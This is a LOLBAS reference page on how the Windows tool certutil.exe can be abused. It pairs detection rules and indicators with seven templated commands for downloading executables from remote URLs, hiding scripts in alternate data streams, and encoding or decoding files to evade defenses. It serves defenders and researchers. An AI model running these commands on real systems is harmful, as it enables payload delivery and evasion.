---
title: "Certutil.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Certutil/
fetched_at: 2026-09-20T17:09:29Z
license: unspecified
category: windows
---

Windows binary used for handling certificates

## Paths
- C:\Windows\System32\certutil.exe
- C:\Windows\SysWOW64\certutil.exe

## Resources
- [https://twitter.com/Moriarty_Meng/status/984380793383370752](https://twitter.com/Moriarty_Meng/status/984380793383370752)
- [https://twitter.com/mattifestation/status/620107926288515072](https://twitter.com/mattifestation/status/620107926288515072)
- [https://twitter.com/egre55/status/1087685529016193025](https://twitter.com/egre55/status/1087685529016193025)
- [https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/](https://www.hexacorn.com/blog/2020/08/23/certutil-one-more-gui-lolbin/)

## Acknowledgements
- Matt Graeber ([@mattifestation](https://twitter.com/@mattifestation))
- Moriarty ([@Moriarty_Meng](https://twitter.com/@Moriarty_Meng))
- egre55 ([@egre55](https://twitter.com/@egre55))
- Lior Adar
- Adam ([@hexacorn](https://twitter.com/@hexacorn))
- SomeTestLeper ([@SomeTestLeper](https://twitter.com/@SomeTestLeper))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml](https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml)
- Splunk: [https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml](https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml)
- Splunk: [https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml](https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml)
- Splunk: [https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml](https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml)
- IOC: Certutil.exe creating new files on disk
- IOC: Useragent Microsoft-CryptoAPI/10.0
- IOC: Useragent CertUtil URL Agent

## Download

1. Download and save an executable to disk in the current folder.

```
certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}
```

   - Use case: Download file from Internet

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

2. Download and save an executable to disk in the current folder when a file path is specified, or %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash> when not.

```
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
```

   - Use case: Download file from Internet

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

3. Download and save an executable to %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\<hash>.

```
certutil.exe -URL {REMOTEURL:.exe}
```

   - Use case: Download file from Internet

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Application: GUI

4. Download and save a .ps1 file to an Alternate Data Stream (ADS).

```
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
```

   - Use case: Download file from Internet and save it in an NTFS Alternate Data Stream

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1564.004

5. Command to encode a file using Base64

```
certutil -encode {PATH} {PATH:.base64}
```

   - Use case: Encode files to evade defensive measures

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1027.013

6. Command to decode a Base64 encoded file.

```
certutil -decode {PATH:.base64} {PATH}
```

   - Use case: Decode files to evade defensive measures

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1140

7. Command to decode a hexadecimal-encoded file.

```
certutil -decodehex {PATH:.hex} {PATH}
```

   - Use case: Decode files to evade defensive measures

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1140
